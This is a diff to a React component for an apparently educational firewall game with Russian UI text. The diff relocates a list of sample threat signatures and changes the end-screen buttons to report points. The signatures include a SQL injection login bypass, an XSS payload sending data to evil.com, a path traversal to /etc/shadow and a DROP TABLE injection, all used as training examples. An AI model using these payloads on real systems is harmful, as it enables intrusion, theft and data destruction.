@@ -1,9 +1,16 @@
 import React, { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
-import { Shield, Search, AlertCircle, Check, Terminal, Activity, Lock, Skull, Database } from 'lucide-react';
+import { Shield, Search, AlertCircle, Check, Terminal, Activity, Skull, Database } from 'lucide-react';
+
+const THREAT_SIGNATURES = [
+    { type: 'SQLi', payload: "POST /login?u=admin&p=' OR '1'='1" },
+    { type: 'XSS', payload: "GET /q=<script>fetch('http://evil.com/leak')</script>" },
+    { type: 'BruteForce', payload: "AUTH_FAIL: admin (Attempt 432/5000)" },
+    { type: 'PathTraversal', payload: "GET /v1/download?file=../../../../etc/shadow" },
+    { type: 'SQLi', payload: "SELECT * FROM users WHERE id=1; DROP TABLE users;" }
+];
 
 const FirewallMission = ({ username, currentPoints, onComplete }) => {
-    const [level, setLevel] = useState(1);
     const [logs, setLogs] = useState([]);
     const [selectedLog, setSelectedLog] = useState(null);
     const [feedback, setFeedback] = useState(null);
@@ -19,16 +26,6 @@ const FirewallMission = ({ username, currentPoints, onComplete }) => {
         PathTraversal: { title: "Path Traversal", explanation: "Попытка доступа к системным файлам сервера (../../etc/passwd). ОПАСНО.", safe: false },
         CLEAN: { title: "Чистый трафик", explanation: "Стандартный системный запрос. Блокировка вызовет отказ в обслуживании (DoS) для клиента.", safe: true }
     };
-
-    const THREAT_SIGNATURES = [
-        { type: 'SQLi', payload: "POST /login?u=admin&p=' OR '1'='1" },
-        { type: 'XSS', payload: "GET /q=<script>fetch('http://evil.com/leak')</script>" },
-        { type: 'BruteForce', payload: "AUTH_FAIL: admin (Attempt 432/5000)" },
-        { type: 'PathTraversal', payload: "GET /v1/download?file=../../../../etc/shadow" },
-        { type: 'SQLi', payload: "SELECT * FROM users WHERE id=1; DROP TABLE users;" }
-    ];
-
-    const PORTS = [21, 22, 25, 53, 80, 110, 443, 3306, 3389, 5432, 8080];
 
     // Логика игры
     useEffect(() => {
@@ -107,7 +104,7 @@ const FirewallMission = ({ username, currentPoints, onComplete }) => {
             <Skull size={80} color="#ff4d4d" />
             <h1 className="glitch-text" style={{ color: '#ff4d4d', fontSize: '40px' }}>SYSTEM CRASHED</h1>
             <p style={{ color: '#ff4d4d' }}>Периметр прорван. Базы данных скомпрометированы.</p>
-            <button className="btn-huge" style={{ background: '#ff4d4d', color: '#000', marginTop: '20px' }} onClick={() => window.location.reload()}>ПЕРЕЗАГРУЗКА</button>
+            <button className="btn-huge" style={{ background: '#ff4d4d', color: '#000', marginTop: '20px' }} onClick={() => onComplete(currentPoints)}>ПЕРЕЗАГРУЗКА</button>
         </div>
     );
 
@@ -118,7 +115,7 @@ const FirewallMission = ({ username, currentPoints, onComplete }) => {
             <div className="glitch-text" style={{ fontSize: '40px', color: '#00ff41', margin: '20px 0' }}>ACCESS GRANTED</div>
             <h2>ПЕРИМЕТР ОЧИЩЕН</h2>
             <p>Заработано XP: {xp + (health * 5)}</p>
-            <button className="btn-huge ready" style={{ marginTop: '20px' }} onClick={() => window.location.reload()}>ВЕРНУТЬСЯ В ТЕРМИНАЛ</button>
+            <button className="btn-huge ready" style={{ marginTop: '20px' }} onClick={() => onComplete(currentPoints + xp + (health * 5))}>ВЕРНУТЬСЯ В ТЕРМИНАЛ</button>
         </div>
     );
 
